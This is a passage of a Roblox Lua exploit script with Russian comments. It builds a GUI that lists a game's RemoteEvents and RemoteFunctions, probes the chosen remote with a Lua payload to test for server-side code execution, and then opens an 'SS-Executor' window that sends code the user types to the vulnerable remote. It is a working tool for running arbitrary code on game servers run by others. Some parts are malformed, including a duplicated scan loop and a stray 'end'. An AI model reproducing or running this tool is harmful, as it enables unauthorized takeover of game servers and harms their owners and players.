    local listContainer = Instance.new("ScrollingFrame")
    listContainer.Size = UDim2.new(1, -10, 1, -40)
    listContainer.Position = UDim2.new(0, 5, 0, 35)
    listContainer.BackgroundTransparency = 1
    listContainer.CanvasSize = UDim2.new(0, 0, 0, 0)
    listContainer.AutomaticCanvasSize = Enum.AutomaticSize.Y
    listContainer.ScrollBarThickness = 4
    listContainer.Parent = remoteListWindow
    
    local listLayout = Instance.new("UIListLayout", listContainer)
    listLayout.Padding = UDim.new(0, 2)
    
    -- Собираем все ремувенты из игры (как в вашем Events/Functions)
    local allRemotes = {}
local function collectRemotes(parent, path)
    for _, child in pairs(parent:GetChildren()) do
        local newPath = path .. "/" .. child.Name
        if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
            table.insert(allRemotes, {name = child.Name, path = newPath, obj = child})
        else
            collectRemotes(child, newPath)
        end
    end
end

local scanServices = {game.ReplicatedStorage, game.Workspace, game.Lighting}
for _, svc in pairs(scanServices) do
    if svc then collectRemotes(svc, svc.Name) end
        end
    
    local scanServices = {game.ReplicatedStorage, game.Workspace, game.Lighting}
    for _, svc in pairs(scanServices) do
        if svc then collectRemotes(svc, svc.Name) end
    end
    
    for _, rem in pairs(allRemotes) do
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(1, -10, 0, 30)
        btn.Text = rem.name .. " (" .. rem.path .. ")"
        btn.TextSize = 11
        btn.BackgroundColor3 = Color3.fromRGB(50, 50, 55)
        btn.Font = Enum.Font.Gotham
        btn.TextColor3 = Color3.new(1, 1, 1)
        btn.Parent = listContainer
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 4)
        
        btn.MouseButton1Click:Connect(function()
            selectedRemote = rem
            selectedRemoteLabel.Text = "Selected Remote: " .. rem.name
            remoteListWindow:Destroy()
            remoteListWindow = nil
            ShowNotification("Selected: " .. rem.name, false)
        end)
    end
end)

-- Кнопка сканирования выбранного ремувента
local scanSelectedBtn = Instance.new("TextButton")
scanSelectedBtn.Size = UDim2.new(1, -10, 0, 35)
scanSelectedBtn.Position = UDim2.new(0, 5, 0, 75)
scanSelectedBtn.Text = "Scan Selected Remote"
scanSelectedBtn.BackgroundColor3 = Color3.fromRGB(50, 150, 80)
scanSelectedBtn.Font = Enum.Font.GothamSemibold
scanSelectedBtn.TextColor3 = Color3.new(1, 1, 1)
scanSelectedBtn.Parent = scanPanel
Instance.new("UICorner", scanSelectedBtn).CornerRadius = UDim.new(0, 6)

scanSelectedBtn.MouseButton1Click:Connect(function()
    if not selectedRemote then
        ShowNotification("No remote selected!", true)
        return
    end
    
    ShowNotification("Scanning " .. selectedRemote.name .. "...", false)
    
    -- АДАПТИРОВАННАЯ ЛОГИКА СКАНЕРА ДЛЯ ОДНОГО РЕМУВЕНТА
    local nonce = tostring(math.random(100000, 999999))
    local found = false
    local remoteObj = selectedRemote.obj
    local remoteFunc = remoteObj:IsA("RemoteEvent") and remoteObj.FireServer or remoteObj.InvokeServer
    
    -- Тестовый payload (как в оригинальном скрипте)
    local testPayload = string.format([[
        local a,b,c,d=game:GetService("LogService"),game.SetAttribute,task.delay,"%s"
        b(a,d,"%s")
        c(5,b,a,d,nil)
    ]], nonce, nonce)
    
    -- Отслеживаем изменения атрибута в LogService
    local connection
    connection = game:GetService("LogService").AttributeChanged:Connect(function(attr)
        if attr == nonce then
            connection:Disconnect()
            found = true
            ShowNotification("VULNERABLE! Remote can execute code!", false)
            -- Открываем окно с результатом
            CreateResultWindow(selectedRemote)
        end
    end)
    
    -- Отправляем payload
    local success, err = pcall(function()
        if remoteObj:IsA("RemoteEvent") then
            remoteObj:FireServer(testPayload)
        else
            remoteObj:InvokeServer(testPayload)
        end
    end)
    
    if not success then
        connection:Disconnect()
        ShowNotification("Error calling remote: " .. tostring(err), true)
        return
    end
    
    -- Таймаут на случай, если уязвимость не найдена
    task.delay(5, function()
        if connection and connection.Connected then
            connection:Disconnect()
            if not found then
                ShowNotification("Not vulnerable.", false)
            end
        end
    end)
end)

-- Функция создания окна результата (SS-Executor)
function CreateResultWindow(remoteData)
    local resultFrame = Instance.new("Frame")
    resultFrame.Size = UDim2.new(0, 400, 0, 300)
    resultFrame.Position = UDim2.new(0.5, -200, 0.5, -150)
    resultFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
    resultFrame.BorderSizePixel = 0
    resultFrame.Parent = ScreenGui
    Instance.new("UICorner", resultFrame).CornerRadius = UDim.new(0, 8)
    
    -- Заголовок
    local titleBar = Instance.new("Frame")
    titleBar.Size = UDim2.new(1, 0, 0, 35)
    titleBar.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
    titleBar.Parent = resultFrame
    Instance.new("UICorner", titleBar).CornerRadius = UDim.new(0, 8)
    
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, -90, 1, 0)
    title.Position = UDim2.new(0, 10, 0, 0)
    title.Text = "SS-Executor: " .. remoteData.name
    title.TextColor3 = Color3.new(1, 1, 1)
    title.BackgroundTransparency = 1
    title.Font = Enum.Font.GothamBold
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.Parent = titleBar
    
    local minimizeBtn = Instance.new("TextButton")
    minimizeBtn.Size = UDim2.new(0, 30, 1, 0)
    minimizeBtn.Position = UDim2.new(1, -60, 0, 0)
    minimizeBtn.Text = "—"
    minimizeBtn.TextColor3 = Color3.new(0.8, 0.8, 0.8)
    minimizeBtn.BackgroundTransparency = 1
    minimizeBtn.Parent = titleBar
    
    local closeBtn = Instance.new("TextButton")
    closeBtn.Size = UDim2.new(0, 30, 1, 0)
    closeBtn.Position = UDim2.new(1, -30, 0, 0)
    closeBtn.Text = "✕"
    closeBtn.TextColor3 = Color3.fromRGB(255, 80, 80)
    closeBtn.BackgroundTransparency = 1
    closeBtn.Parent = titleBar
    closeBtn.MouseButton1Click:Connect(function() resultFrame:Destroy() end)
    
    local content = Instance.new("Frame")
    content.Size = UDim2.new(1, -20, 1, -55)
    content.Position = UDim2.new(0, 10, 0, 45)
    content.BackgroundTransparency = 1
    content.Parent = resultFrame
    
    local codeBox = Instance.new("TextBox")
    codeBox.Size = UDim2.new(1, 0, 1, -50)
    codeBox.Position = UDim2.new(0, 0, 0, 0)
    codeBox.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
    codeBox.TextColor3 = Color3.new(1, 1, 1)
    codeBox.Text = "print('Hello from server!')"
    codeBox.TextWrapped = true
    codeBox.TextXAlignment = "Left"
    codeBox.TextYAlignment = "Top"
    codeBox.ClearTextOnFocus = false
    codeBox.Font = Enum.Font.Code
    codeBox.TextSize = 12
    codeBox.Parent = content
    Instance.new("UICorner", codeBox).CornerRadius = UDim.new(0, 6)
    
    local buttonBar = Instance.new("Frame")
    buttonBar.Size = UDim2.new(1, 0, 0, 40)
    buttonBar.Position = UDim2.new(0, 0, 1, -40)
    buttonBar.BackgroundTransparency = 1
    buttonBar.Parent = content
    
    local executeBtn = Instance.new("TextButton")
    executeBtn.Size = UDim2.new(0.3, -5, 1, -5)
    executeBtn.Position = UDim2.new(0, 0, 0, 0)
    executeBtn.Text = "Execute"
    executeBtn.BackgroundColor3 = Color3.fromRGB(50, 150, 80)
    executeBtn.Font = Enum.Font.GothamSemibold
    executeBtn.TextColor3 = Color3.new(1, 1, 1)
    executeBtn.Parent = buttonBar
    Instance.new("UICorner", executeBtn).CornerRadius = UDim.new(0, 6)
    
    local clearBtn = Instance.new("TextButton")
    clearBtn.Size = UDim2.new(0.3, -5, 1, -5)
    clearBtn.Position = UDim2.new(0.35, 0, 0, 0)
    clearBtn.Text = "Clear"
    clearBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 120)
    clearBtn.Font = Enum.Font.GothamSemibold
    clearBtn.TextColor3 = Color3.new(1, 1, 1)
    clearBtn.Parent = buttonBar
    Instance.new("UICorner", clearBtn).CornerRadius = UDim.new(0, 6)
    
    local copyBtn = Instance.new("TextButton")
    copyBtn.Size = UDim2.new(0.3, -5, 1, -5)
    copyBtn.Position = UDim2.new(0.7, 0, 0, 0)
    copyBtn.Text = "Copy"
    copyBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 150)
    copyBtn.Font = Enum.Font.GothamSemibold
    copyBtn.TextColor3 = Color3.new(1, 1, 1)
    copyBtn.Parent = buttonBar
    Instance.new("UICorner", copyBtn).CornerRadius = UDim.new(0, 6)
    
    clearBtn.MouseButton1Click:Connect(function()
        codeBox.Text = ""
    end)
    
    copyBtn.MouseButton1Click:Connect(function()
        setclipboard(codeBox.Text)
        ShowNotification("Copied to clipboard!", false)
    end)
    
    executeBtn.MouseButton1Click:Connect(function()
        local source = codeBox.Text
        if source and source ~= "" then
            -- Отправляем код через найденный уязвимый ремувент
            local remoteFunc = remoteData.obj:IsA("RemoteEvent") and remoteData.obj.FireServer or remoteData.obj.InvokeServer
            pcall(function()
                if remoteData.obj:IsA("RemoteEvent") then
                    remoteData.obj:FireServer(source)
                else
                    remoteData.obj:InvokeServer(source)
                end
            end)
            ShowNotification("Code sent to server!", false)
        end
    end)
    
    local isMinimized = false
    minimizeBtn.MouseButton1Click:Connect(function()
        isMinimized = not isMinimized
        if isMinimized then
            content.Visible = false
            resultFrame:TweenSize(UDim2.new(0, 400, 0, 35), "Out", "Quad", 0.2, true)
            minimizeBtn.Text = "+"
        else
            content.Visible = true
            resultFrame:TweenSize(UDim2.new(0, 400, 0, 300), "Out", "Quad", 0.2, true)
            minimizeBtn.Text = "—"
        end
    end)
end

local tSettings = CreateTab("Settings")

local function UpdateTheme(color)
    MainFrame.BackgroundColor3 = color
    Header.BackgroundColor3 = color:lerp(Color3.new(0,0,0),0.2)
    Side.BackgroundColor3 = color:lerp(Color3.new(0,0,0),0.3)
    for _, star in pairs(stars) do star.Visible = false end
end

CreateButton(tSettings, "Black Theme", Color3.fromRGB(15,15,15), function()
    UpdateTheme(Color3.fromRGB(15,15,15))
end)

CreateButton(tSettings, "Void Theme", Color3.fromRGB(8,8,12), function()
    UpdateTheme(Color3.fromRGB(8,8,12))
    Header.BackgroundColor3 = Color3.fromRGB(12,12,18)
    Side.BackgroundColor3 = Color3.fromRGB(5,5,8)
    for _, star in pairs(stars) do star.Visible = true end
end)

allTabs["Info"].Visible = true
